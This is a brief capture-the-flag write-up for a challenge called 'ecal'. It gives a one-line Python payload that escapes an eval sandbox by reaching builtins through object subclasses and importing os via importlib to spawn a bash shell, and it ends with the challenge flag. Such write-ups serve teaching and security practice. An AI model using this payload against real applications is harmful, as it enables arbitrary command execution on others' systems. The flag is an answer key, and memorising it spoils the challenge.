# ecal
Solved by: benkyou

### Question:
let's eval the calculator

### Solution:
Obtain builtins from subclasses then use `importlib.import_module()` to get pass the import restriction.
```python
''.__class__.__bases__[0].__subclasses__()[-1].__init__.__globals__['__builtins__']['__import__']('importlib').import_module('os').system('bash')
```

**Flag:** `FMCTF{ev4luat1ng_calc_m5y_b3c0me_d4ng3r0us}`
